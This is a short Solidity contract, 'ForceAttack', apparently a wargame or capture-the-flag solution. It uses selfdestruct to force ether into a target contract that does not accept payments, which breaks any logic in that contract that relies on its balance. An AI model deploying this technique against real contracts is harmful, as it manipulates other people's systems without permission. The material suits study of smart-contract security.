pragma solidity ^0.4.11;

contract ForceAttack {

  function ForceAttack() payable {}
  function() payable {}

  function attack(address target) {
    selfdestruct(target);
  }
}
